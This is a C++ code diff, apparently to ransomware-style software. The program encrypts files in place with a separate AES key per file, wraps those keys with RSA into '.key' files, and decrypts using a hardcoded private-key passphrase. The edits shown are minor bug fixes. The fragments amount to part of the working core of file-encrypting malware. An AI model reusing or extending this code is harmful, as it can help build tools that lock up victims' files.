@@ -149,13 +149,10 @@ void do_decryption() {
 
 	RSA *rsa = RSA_new();
 	rsa = PEM_read_bio_RSAPrivateKey(in, &rsa, NULL, "SuP3RS3Cr3tPa$$w0Rd");
-	try {
-		boost::filesystem::remove(key_path);	// Delete private key
 
-	}
-	catch (...) {
-
-	}
+	BIO_free_all(in);
+	
+	boost::filesystem::remove(key_path);	// Delete private key
 
 	/* Stores path of key files for decryption */
 	moodycamel::ConcurrentQueue<wstring> path_queue;
@@ -353,7 +350,7 @@ void enc_path_consumer_key_producer_thread(enc_p_cons_k_prod_bundle& pk_bundle) 
 	do {
 		items_left = p_doneProducer.load(memory_order_acquire) != p_producer_count;
 		while (p_queue.try_dequeue_from_producer(p_ptok, path_str)) {
-			wprintf(L"Encrypting %s/n", &path_str[0]);
+			wprintf(L"Encrypting %s\n", &path_str[0]);
 			items_left = true;
 
 			AESCrypto aes = AESCrypto();	// New key for each file
@@ -391,7 +388,7 @@ void enc_key_consumer_thread(enc_k_consumer_bundle& k_bundle) {
 			path = get<0>(path_key_tag);
 			aes_key_and_tag = get<1>(path_key_tag);
 
-			wprintf(L"Encrypting key for %s/n", &path[0]);
+			wprintf(L"Encrypting key for %s\n", &path[0]);
 
 			path = path + L".key";
 			rsa.encrypt_key(path, aes_key_and_tag, 32+16);
@@ -482,7 +479,7 @@ void dec_path_consumer_thread(dec_p_cons_bundle& p_bundle) {
 	do {
 		items_left = p_doneProducer.load(memory_order_acquire) != p_producer_count;
 		while (queue.try_dequeue_from_producer(ptok, path)) {
-			wprintf(L"Decrypting key: %s/n", &path[0]);
+			wprintf(L"Decrypting key: %s\n", &path[0]);
 
 			unsigned char aes_key_gcm_tag[32 + 16];
 
@@ -492,7 +489,7 @@ void dec_path_consumer_thread(dec_p_cons_bundle& p_bundle) {
 
 			path.resize(path.size() - 4);	// Remove ".key" from path
 
-			wprintf(L"Decrypting file: %s/n", &path[0]);
+			wprintf(L"Decrypting file: %s\n", &path[0]);
 
 			aes.in_place_decrypt(path, aes_key_gcm_tag + 32);
 		}
